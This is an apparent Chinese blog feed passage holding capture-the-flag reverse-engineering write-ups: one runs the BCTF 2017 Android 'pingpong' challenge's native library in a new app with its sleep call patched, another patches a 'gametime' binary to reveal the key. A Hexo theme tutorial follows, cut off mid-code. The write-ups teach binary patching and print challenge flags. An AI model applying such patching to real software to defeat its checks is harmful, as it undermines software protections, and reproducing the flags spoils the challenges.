class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.geekerchina.pingpongmachine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.Menu;</span><br><span class="line"><span class="keyword">import</span> android.view.MenuItem;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    OnClickListener jping = <span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.tt % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.p = <span class="number">0</span>;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.num = <span class="number">0</span>;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.tt = MainActivity.<span class="keyword">this</span>.ttt;</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.tt--;</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.p = MainActivity.<span class="keyword">this</span>.ping(MainActivity.<span class="keyword">this</span>.p, MainActivity.<span class="keyword">this</span>.num);</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.num++;</span><br><span class="line">            <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.num &gt;= <span class="number">7</span>) &#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.num = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            TextView t = (TextView) MainActivity.<span class="keyword">this</span>.findViewById(R.id.out);</span><br><span class="line">            t.setText(<span class="string">"PING"</span>);</span><br><span class="line">            <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.tt == <span class="number">0</span>) &#123;</span><br><span class="line">                t.setText(<span class="string">"FLAG: BCTF&#123;MagicNum"</span> + Integer.toString(MainActivity.<span class="keyword">this</span>.p) + <span class="string">"&#125;"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    OnClickListener jpong = <span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.tt % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.p = <span class="number">0</span>;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.num = <span class="number">0</span>;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.tt = MainActivity.<span class="keyword">this</span>.ttt;</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.tt--;</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.p = MainActivity.<span class="keyword">this</span>.pong(MainActivity.<span class="keyword">this</span>.p, MainActivity.<span class="keyword">this</span>.num);</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.num++;</span><br><span class="line">            <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.num &gt;= <span class="number">7</span>) &#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.num = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            TextView t = (TextView) MainActivity.<span class="keyword">this</span>.findViewById(R.id.out);</span><br><span class="line">            t.setText(<span class="string">"PONG"</span>);</span><br><span class="line">            <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.tt == <span class="number">0</span>) &#123;</span><br><span class="line">                t.setText(<span class="string">"FLAG: BCTF&#123;MagicNum"</span> + Integer.toString(MainActivity.<span class="keyword">this</span>.p) + <span class="string">"&#125;"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> p = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> tt = <span class="keyword">this</span>.ttt;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> ttt = <span class="number">1000000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">ping</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> i2)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">pong</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> i2)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* access modifiers changed from: protected */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView((<span class="keyword">int</span>) R.layout.activity_main);</span><br><span class="line">        ((Button) findViewById(R.id.button)).setOnClickListener(<span class="keyword">this</span>.jping);</span><br><span class="line">        ((Button) findViewById(R.id.button2)).setOnClickListener(<span class="keyword">this</span>.jpong);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</span><br><span class="line">        getMenuInflater().inflate(R.menu.menu_main, menu);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(MenuItem item)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (item.getItemId() == R.id.action_settings) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.onOptionsItemSelected(item);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">"pp"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这是主要逻辑<br>需要循环点击ping pong按钮，直到出现flag<br>ping pong函数属于native层的函数</p></blockquote><p><img src="/images/pasted-84.png" alt="upload successful"></p><p><img src="/images/pasted-85.png" alt="upload successful"></p><blockquote><p>so库的两个主要函数，都是经过了混淆，这里可以利用so库移植到别的程序上，通过程序来实现点击按钮的效果，而ping pong函数每次执行都会沉睡1s，1000000s的时间后就会得到flag了，所以我们需要修改so库的sleep函数</p></blockquote><p><img src="/images/pasted-86.png" alt="upload successful"></p><blockquote><p>另一个函数同理</p></blockquote><h3 id="编写app"><a href="#编写app" class="headerlink" title="编写app"></a>编写app</h3><ol><li>创建一个与源程序名称相同的app</li></ol><p><img src="/images/pasted-87.png" alt="upload successful"></p><ol start="2"><li>将程序中的so库移动到新建的app的libs目录下</li></ol><p><img src="/images/pasted-88.png" alt="upload successful"></p><ol start="3"><li>修改build.gradle<blockquote><p>添加一下代码</p></blockquote></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">task <span class="title">nativeLibsToJar</span><span class="params">(type: Zip, description: <span class="string">"create a jar archive of the native libs"</span>)</span> </span>&#123;</span><br><span class="line">    <span class="function">destinationDir <span class="title">file</span><span class="params">(<span class="string">"$projectDir/libs"</span>)</span></span></span><br><span class="line"><span class="function">    baseName "Native_Libs2"</span></span><br><span class="line"><span class="function">    extension "jar"</span></span><br><span class="line"><span class="function">    from <span class="title">fileTree</span><span class="params">(dir: <span class="string">"libs"</span>, include: <span class="string">"**/*.so"</span>)</span></span></span><br><span class="line"><span class="function">    into "lib"</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">tasks.<span class="title">withType</span><span class="params">(JavaCompile)</span> </span>&#123;</span><br><span class="line">    compileTask -&gt; compileTask.dependsOn(nativeLibsToJar)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>修改MainActivity代码</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.geekerchina.pingpongmachine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String TAG = <span class="string">"MainActivity"</span>;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">"pp"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">ping</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> i2)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">pong</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> i2)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView((<span class="keyword">int</span>) R.layout.activity_main);</span><br><span class="line">        <span class="keyword">int</span> ttt = <span class="number">1000000</span>;</span><br><span class="line">        <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> tt = ttt;</span><br><span class="line">        <span class="keyword">int</span> p = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (tt % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                tt--;</span><br><span class="line">                p = pong(p, num);</span><br><span class="line">                num++;</span><br><span class="line">                <span class="keyword">if</span> (num &gt;= <span class="number">7</span>) &#123;</span><br><span class="line">                    num = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (tt == <span class="number">0</span>) &#123;</span><br><span class="line">                    Log.d(TAG, <span class="string">"BCTF&#123;MagicNum"</span> + Integer.toString(p) + <span class="string">"&#125;"</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                tt--;</span><br><span class="line">                p = ping(p, num);</span><br><span class="line">                num++;</span><br><span class="line">                <span class="keyword">if</span> (num &gt;= <span class="number">7</span>) &#123;</span><br><span class="line">                    num = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (tt == <span class="number">0</span>) &#123;</span><br><span class="line">                    Log.d(TAG, <span class="string">"BCTF&#123;MagicNum"</span> + Integer.toString(p) + <span class="string">"&#125;"</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="/images/pasted-89.png" alt="upload successful"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>so库移植使用起来，真是能够减少对so层代码的研究，节省时间</p></blockquote><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://stfpeak.github.io/2017/04/18/bctf-2017-pingpong-writeup/" target="_blank" rel="noopener">https://stfpeak.github.io/2017/04/18/bctf-2017-pingpong-writeup/</a><br><a href="https://blog.csdn.net/JasaLee/article/details/70242837" target="_blank" rel="noopener">https://blog.csdn.net/JasaLee/article/details/70242837</a></p>]]></content>
      
      
      <categories>
          
          <category> android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>attackworld-gametime</title>
      <link href="/attackworld-gametime.html"/>
      <url>/attackworld-gametime.html</url>
      
        <content type="html"><![CDATA[<h3 id="gametime"><a href="#gametime" class="headerlink" title="gametime"></a>gametime</h3><p><img src="/images/pasted-78.png" alt="upload successful"></p><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><blockquote><p>定位主函数<br><img src="/images/pasted-79.png" alt="upload successful"></p></blockquote><p><img src="/images/pasted-80.png" alt="upload successful"></p><blockquote><p>打开程序看看</p></blockquote><p><img src="/images/pasted-81.png" alt="upload successful"></p><blockquote><p>玩几局发现，程序这游戏就行天天炫舞一样，只不过，我们输错了，它就会退出</p></blockquote><h3 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h3><blockquote><p>既然我们输入的不对就会退出，那不如，我们输入对的就会退出，修改代码<br>sub_1381435<br><img src="/images/pasted-82.png" alt="upload successful"><br>sub_1381507<br><img src="/images/pasted-83.png" alt="upload successful"><br>两函数虽然一样，但是是不同的函数，只修改一个达不到效果</p></blockquote><h3 id="运行破解之后的程序"><a href="#运行破解之后的程序" class="headerlink" title="运行破解之后的程序"></a>运行破解之后的程序</h3><blockquote><p>在需要输入的地方按下回车键就行了</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\TideSec\Desktop\ctf&gt;gametime.exe</span><br><span class="line">        ZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMG</span><br><span class="line">        ZOMGZOMG                                ZOMGZOMG</span><br><span class="line">        ZOMGZOMG     TAP TAP REVOLUTION!!!!!!!  ZOMGZOMG</span><br><span class="line">        ZOMGZOMG                                ZOMGZOMG</span><br><span class="line">        ZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMG</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                      R U READDY?!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The game is starting <span class="keyword">in</span>...</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">ZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMG</span><br><span class="line"></span><br><span class="line">When you see an <span class="string">'s'</span>, press the space bar</span><br><span class="line"></span><br><span class="line">ZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMG</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">..........s</span><br><span class="line">ZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMG</span><br><span class="line"></span><br><span class="line">When you see an <span class="string">'x'</span>, press the <span class="string">'x'</span> key</span><br><span class="line"></span><br><span class="line">ZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMG</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">........x</span><br><span class="line">ZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMG</span><br><span class="line"></span><br><span class="line">When you see an <span class="string">'m'</span>, press the <span class="string">'m'</span> key</span><br><span class="line"></span><br><span class="line">ZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMG</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">.....m</span><br><span class="line">TRAINING COMPLETE!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Now you know everything you need to know....</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> the rest of your life!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LETS PLAY !</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">.....s</span><br><span class="line">..x</span><br><span class="line">.m</span><br><span class="line">ooooh, you fancy!!!</span><br><span class="line">.....m</span><br><span class="line">..x</span><br><span class="line">.s</span><br><span class="line">key is not (NIIICE JOB)!!!!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.....m</span><br><span class="line">...s</span><br><span class="line">.....m</span><br><span class="line">...s</span><br><span class="line">....x</span><br><span class="line">.....m</span><br><span class="line">...s</span><br><span class="line">...s</span><br><span class="line">...s</span><br><span class="line">....x</span><br><span class="line">TURBO TIME!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key is  (no5c30416d6cf52638460377995c6a8cf5)</span><br><span class="line"></span><br><span class="line">.m                               )(</span><br><span class="line">.x                               )(</span><br><span class="line">.m                               )(</span><br></pre></td></tr></table></figure><blockquote><p>key就是要找的flag</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gametime </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo next 7.xx添加背景图片</title>
      <link href="/hexo-next-7-xx%E6%B7%BB%E5%8A%A0%E8%83%8C%E6%99%AF%E5%9B%BE%E7%89%87.html"/>
      <url>/hexo-next-7-xx%E6%B7%BB%E5%8A%A0%E8%83%8C%E6%99%AF%E5%9B%BE%E7%89%87.html</url>
      
        <content type="html"><![CDATA[<h3 id="主题配置文件-config-yml"><a href="#主题配置文件-config-yml" class="headerlink" title="主题配置文件_config.yml"></a>主题配置文件_config.yml</h3><blockquote><p>找到custom_file_path，将如图所示的代码取消注释<br><img src="/images/pasted-74.png" alt="upload successful"></p></blockquote><h3 id="站点根目录"><a href="#站点根目录" class="headerlink" title="站点根目录"></a>站点根目录</h3><blockquote><p>新建文件source/_data/style.styl<br><img src="/images/pasted-76.png" alt="upload successful"></p></blockquote><h3 id="输入相关代码"><a href="#输入相关代码" class="headerlink" title="输入相关代码"></a>输入相关代码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加背景图片</span></span><br><span class="line">body &#123;</span><br><span class="line">      background: url(https:<span class="comment">//source.unsplash.com/random/1600x900?wallpapers);//自己喜欢的图片地址</span></span><br><span class="line">      background-size: cover;</span><br><span class="line">      background-repeat: no-repeat;</span><br><span class="line">      background-attachment: fixed;</span><br><span class="line">      background-position: <span class="number">50</span>% <span class="number">50</span>%;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改主体透明度</span></span><br><span class="line">.main-inner 